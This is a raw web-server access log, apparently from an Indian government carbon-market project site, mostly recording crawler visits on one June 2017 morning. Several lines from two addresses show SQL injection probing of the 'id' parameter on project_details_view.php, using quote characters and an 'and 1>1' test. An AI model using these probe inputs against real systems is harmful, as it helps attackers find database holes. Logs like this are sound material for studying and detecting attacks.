202.46.54.29 - - [19/Jun/2017:05:34:09 +0530] "GET /project_details_view.php?id=364 HTTP/1.1" 200 14255 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
207.46.13.160 - - [19/Jun/2017:05:34:48 +0530] "GET /registration.php HTTP/1.1" 302 28529 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:05:34:50 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:05:34:51 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.15 - - [19/Jun/2017:05:34:57 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [19/Jun/2017:05:34:57 +0530] "GET /project_details_view.php?id=1731 HTTP/1.1" 200 14113 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.146 - - [19/Jun/2017:05:37:03 +0530] "GET /detail_news.php?id=10 HTTP/1.1" 302 20219 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.146 - - [19/Jun/2017:05:37:06 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.146 - - [19/Jun/2017:05:37:20 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [19/Jun/2017:05:37:29 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
40.77.167.35 - - [19/Jun/2017:05:38:05 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 200 4344697 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [19/Jun/2017:05:38:38 +0530] "GET /images/NCDMA%20PCN%20Format%2017072009.doc HTTP/1.1" 200 114176 "-" "ltx71 - (http://ltx71.com/)"
68.180.228.167 - - [19/Jun/2017:05:38:41 +0530] "GET /approval_process.php HTTP/1.1" 200 25912 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
207.46.13.160 - - [19/Jun/2017:05:39:53 +0530] "GET /contactus.php HTTP/1.1" 200 18292 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.15 - - [19/Jun/2017:05:40:03 +0530] "GET /Approved_proj_reports_list_details.php?id=1&reporttype=1&scale=Small&sdt=&edt=&exec=&page=38 HTTP/1.1" 200 17341 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.73 - - [19/Jun/2017:05:45:09 +0530] "GET /capacity_building.php HTTP/1.1" 200 19186 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:05:46:45 +0530] "GET /approval_process.php HTTP/1.1" 200 25912 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [19/Jun/2017:05:49:58 +0530] "GET /images/NCDMA%20PCN%20Format%2017072009.doc HTTP/1.1" 200 114176 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
64.233.173.51 - - [19/Jun/2017:05:55:36 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.51 - - [19/Jun/2017:05:55:38 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.49 - - [19/Jun/2017:05:55:38 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.47 - - [19/Jun/2017:05:55:38 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.49 - - [19/Jun/2017:05:55:38 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.49 - - [19/Jun/2017:05:55:38 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.47 - - [19/Jun/2017:05:55:38 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.49 - - [19/Jun/2017:05:55:38 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.51 - - [19/Jun/2017:05:55:38 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.51 - - [19/Jun/2017:05:55:38 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.51 - - [19/Jun/2017:05:55:38 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.51 - - [19/Jun/2017:05:55:38 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
64.233.173.49 - - [19/Jun/2017:05:55:38 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
202.46.51.159 - - [19/Jun/2017:05:55:58 +0530] "GET /project_details_view.php?id=11 HTTP/1.1" 200 14858 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.95 - - [19/Jun/2017:06:00:23 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
213.251.182.111 - - [19/Jun/2017:06:06:31 +0530] "GET /project_details_view.php?id=1005'\" HTTP/1.1" 200 11450 "-" "-"
213.251.182.111 - - [19/Jun/2017:06:06:31 +0530] "GET /project_details_view.php?id=1005 HTTP/1.1" 200 14226 "-" "-"
213.251.182.111 - - [19/Jun/2017:06:06:31 +0530] "GET /project_details_view.php?id=10052121121121212.1 HTTP/1.1" 200 11450 "-" "-"
40.77.167.35 - - [19/Jun/2017:06:07:02 +0530] "GET /future_projects.php HTTP/1.1" 302 26210 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [19/Jun/2017:06:07:02 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [19/Jun/2017:06:07:03 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
213.251.182.111 - - [19/Jun/2017:06:07:08 +0530] "GET /project_details_view.php?id=1005%20and%201%3E1 HTTP/1.1" 200 11450 "-" "-"
40.77.167.35 - - [19/Jun/2017:06:07:32 +0530] "GET /news_more.php HTTP/1.1" 200 21061 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
213.251.182.111 - - [19/Jun/2017:06:10:10 +0530] "GET /project_details_view.php?id=1005 HTTP/1.0" 200 14226 "-" "Opera/9.27"
40.77.167.73 - - [19/Jun/2017:06:10:39 +0530] "GET /constitution.php HTTP/1.1" 200 23669 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:10:42 +0530] "GET /detail_news.php?id=11 HTTP/1.1" 302 18421 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:10:42 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:10:43 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.146 - - [19/Jun/2017:06:11:03 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [19/Jun/2017:06:13:03 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 200 4344697 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [19/Jun/2017:06:13:08 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
40.77.167.73 - - [19/Jun/2017:06:13:14 +0530] "GET /downloads/Template_sharing%202Percent.doc HTTP/1.1" 200 73728 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:13:16 +0530] "GET /sitemap.php HTTP/1.1" 200 18469 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [19/Jun/2017:06:14:08 +0530] "GET /future_projects.php HTTP/1.1" 302 26210 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [19/Jun/2017:06:14:26 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 200 4344697 "-" "ltx71 - (http://ltx71.com/)"
45.55.214.36 - - [19/Jun/2017:06:15:35 +0530] "GET /project_details_view.php?id='930 HTTP/1.1" 200 11450 "-" "-"
65.55.210.172 - - [19/Jun/2017:06:16:03 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.172 - - [19/Jun/2017:06:16:03 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.172 - - [19/Jun/2017:06:16:03 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.172 - - [19/Jun/2017:06:16:03 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.172 - - [19/Jun/2017:06:16:05 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.172 - - [19/Jun/2017:06:16:05 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.172 - - [19/Jun/2017:06:16:05 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.172 - - [19/Jun/2017:06:16:05 +0530] "GET /images/login1.jpg HTTP/1.1" 200 618 "http://cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.172 - - [19/Jun/2017:06:16:06 +0530] "GET /images/fe.jpg HTTP/1.1" 200 1429 "http://cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.172 - - [19/Jun/2017:06:16:06 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.172 - - [19/Jun/2017:06:16:06 +0530] "GET /images/bullet3.gif HTTP/1.1" 200 58 "http://cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.172 - - [19/Jun/2017:06:16:06 +0530] "GET /images/login.jpg HTTP/1.1" 200 1044 "http://cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.172 - - [19/Jun/2017:06:16:07 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.172 - - [19/Jun/2017:06:16:07 +0530] "GET /images/midbanner.swf HTTP/1.1" 200 285833 "http://cdmindia.gov.in/images/midbanner.swf" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
146.148.64.128 - - [19/Jun/2017:06:16:24 +0530] "GET /constitution.php HTTP/1.1" 200 23669 "-" "ltx71 - (http://ltx71.com/)"
40.77.167.35 - - [19/Jun/2017:06:17:25 +0530] "GET /future_projects.php HTTP/1.1" 302 26210 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [19/Jun/2017:06:17:26 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [19/Jun/2017:06:17:27 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
202.46.58.154 - - [19/Jun/2017:06:17:47 +0530] "GET /project_details_view_report.php?id=1229 HTTP/1.1" 200 13179 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
146.148.64.128 - - [19/Jun/2017:06:17:55 +0530] "GET /js/base64_encode.js HTTP/1.1" 200 3002 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [19/Jun/2017:06:18:16 +0530] "GET /approval_process.php HTTP/1.1" 200 25912 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [19/Jun/2017:06:18:27 +0530] "GET /js/md5.js HTTP/1.1" 200 13194 "-" "ltx71 - (http://ltx71.com/)"
207.46.13.160 - - [19/Jun/2017:06:18:39 +0530] "GET /detail_news.php?id=16 HTTP/1.1" 302 18332 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:18:40 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:18:41 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:19:40 +0530] "GET /downloads/Existing%20PCN.doc HTTP/1.1" 200 114176 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
146.148.64.128 - - [19/Jun/2017:06:19:50 +0530] "GET /events_more.php HTTP/1.1" 200 16905 "-" "ltx71 - (http://ltx71.com/)"
40.77.167.73 - - [19/Jun/2017:06:20:09 +0530] "GET /capacity_building.php HTTP/1.1" 200 19186 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:21:12 +0530] "GET /sitemap.php HTTP/1.1" 200 18469 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:21:13 +0530] "GET /imp_links.php HTTP/1.1" 200 17834 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:21:14 +0530] "GET /aboutus.php HTTP/1.1" 200 19597 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:21:16 +0530] "GET /detail_events.php?id= HTTP/1.1" 302 16738 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:22:22 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:22:24 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:22:55 +0530] "GET /approved_projects.php?n=1 HTTP/1.1" 200 16642 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.146 - - [19/Jun/2017:06:23:53 +0530] "GET /downloads/New%20PCN.doc HTTP/1.1" 200 435200 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.32 - - [19/Jun/2017:06:23:55 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:24:13 +0530] "GET /reports_new.php?n=1 HTTP/1.1" 200 22411 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.146 - - [19/Jun/2017:06:25:27 +0530] "GET /downloads/Comparision%20of%20PCN_30.03.doc HTTP/1.1" 200 49664 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:26:26 +0530] "GET /detail_news.php?id=18 HTTP/1.1" 302 18713 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:26:28 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:26:29 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:27:14 +0530] "GET /approval_process.php HTTP/1.1" 200 25912 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:27:15 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [19/Jun/2017:06:27:43 +0530] "GET /images/NCDMA%20PCN%20Format%2017072009.doc HTTP/1.1" 200 114176 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:27:48 +0530] "GET /downloads/Existing%20PCN.doc HTTP/1.1" 200 114176 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:29:14 +0530] "GET /detail_news.php?id=18 HTTP/1.1" 302 18713 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:29:16 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:29:17 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.17 - - [19/Jun/2017:06:31:15 +0530] "GET /project_details_view_report.php?id=562 HTTP/1.1" 200 13214 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.177.198 - - [19/Jun/2017:06:34:58 +0530] "GET /js/base64_encode.js HTTP/1.1" 200 3002 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
207.46.13.160 - - [19/Jun/2017:06:38:26 +0530] "GET /registration.php HTTP/1.1" 302 28529 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:38:27 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:38:28 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:38:40 +0530] "GET /project_details_view_report.php?id=1462 HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
5.196.87.48 - - [19/Jun/2017:06:39:35 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
202.46.57.71 - - [19/Jun/2017:06:39:36 +0530] "GET /project_details_view_report.php?id=975 HTTP/1.1" 200 13235 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
40.77.167.73 - - [19/Jun/2017:06:39:46 +0530] "GET /imp_links.php HTTP/1.1" 200 17834 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:40:10 +0530] "GET /project_details_view_report.php?id=1817 HTTP/1.1" 200 13222 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.160 - - [19/Jun/2017:06:41:36 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:41:59 +0530] "GET /aboutus.php HTTP/1.1" 200 19597 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [19/Jun/2017:06:44:00 +0530] "GET /images/h_cons.jpg HTTP/1.1" 200 21924 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:44:10 +0530] "GET /js/index_validations.js HTTP/1.1" 200 3143 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [19/Jun/2017:06:46:20 +0530] "GET /images/h_cb.jpg HTTP/1.1" 200 22394 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:47:29 +0530] "GET /detail_events.php?id= HTTP/1.1" 302 16738 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:47:32 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.73 - - [19/Jun/2017:06:47:33 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
5.196.87.173 - - [19/Jun/2017:06:47:57 +0530] "GET /downloads/Comparision%20of%20PCN_30.03.doc HTTP/1.1" 200 49664 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
40.77.167.35 - - [19/Jun/2017:06:50:03 +0530] "GET /detail_news.php?id=20 HTTP/1.1" 302 18266 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [19/Jun/2017:06:50:04 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
